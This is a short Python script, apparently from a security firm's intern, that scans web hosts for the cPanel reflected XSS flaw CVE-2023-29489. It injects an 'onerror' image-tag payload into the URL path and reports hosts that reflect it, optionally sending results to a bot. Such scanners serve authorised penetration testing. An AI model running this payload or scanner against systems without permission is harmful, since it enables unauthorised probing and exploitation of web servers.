#!/usr/bin/env python3


"""
 * cpanel_xss_2023
 * CVE-2023-29489 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * Developed By mdaseem03 
 * Intern
 * Cappricio Securities <https://cappriciosec.com>
 */
 
"""
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from includes import writefile
from utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from utils import const
from utils import configure
from includes import bot



xss = "<img src=x onerror=\"prompt('hacked')\">aaaaaaaaaaaa"


def cvescan(url, output):
    try:
        with requests.Session() as session:
            
            
            encode = quote(xss)
            fullurl = f'{url}/{encode}'
            
            try:
                response = requests.get(fullurl)
                print(f'testing ===> {fullurl}')
                if (response.status_code == 400) and (xss in response.text):
                    outputprint = (
                                f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                                f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                                f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                            )
                    print(outputprint)
                    if configure.check_id() == "Exist":
                        bot.sendmessage(fullurl)
                    if output is not None:
                        writefile.writedata(
                            output, str(f'{fullurl}\n'))
                        

                
            except requests.exceptions.RequestException as e:
                print(
                    f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")



